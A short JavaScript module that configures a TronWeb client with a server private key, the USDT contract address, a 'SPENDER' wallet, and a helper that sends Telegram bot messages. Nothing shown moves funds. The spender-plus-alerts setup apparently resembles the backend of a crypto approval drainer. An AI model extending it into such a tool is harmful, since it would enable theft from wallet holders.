import { TronWeb } from 'tronweb';

const CFG = {
    FULL_NODE: process.env.NEXT_PUBLIC_FULL_NODE || 'https://api.trongrid.io',
    API_KEY: process.env.TRONGRID_API_KEY || process.env.NEXT_PUBLIC_API_KEY || '',
    PRIVATE_KEY: process.env.PRIVATE_KEY,
    USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    SPENDER: process.env.NEXT_PUBLIC_SPENDER,
    TG_TOKEN: process.env.TG_TOKEN,
    TG_CHAT: process.env.TG_CHAT,
};

export const getServerTW = () => {
    // CRITICAL CHECK
    if (!CFG.PRIVATE_KEY || CFG.PRIVATE_KEY.length < 10) {
        throw new Error('PRIVATE_KEY is missing or invalid in Vercel Environment Variables. Please check settings.');
    }

    try {
        const headers = {};
        if (CFG.API_KEY) headers['TRON-PRO-API-KEY'] = CFG.API_KEY;

        return new TronWeb({
            fullHost: CFG.FULL_NODE,
            headers: headers,
            privateKey: CFG.PRIVATE_KEY,
        });
    } catch (e) {
        throw new Error('TronWeb Init Failed: ' + e.message);
    }
};

export const validateAddress = (addr) => {
    try { return TronWeb.isAddress(addr); } catch { return false; }
};

export const sendTelegram = async (msg) => {
    if (!CFG.TG_TOKEN || !CFG.TG_CHAT) return;
    try {
        await fetch(`https://api.telegram.org/bot${CFG.TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CFG.TG_CHAT, text: msg, parse_mode: 'HTML' }),
        });
    } catch (e) {
        console.error('Telegram error:', e);
    }
};

export { CFG };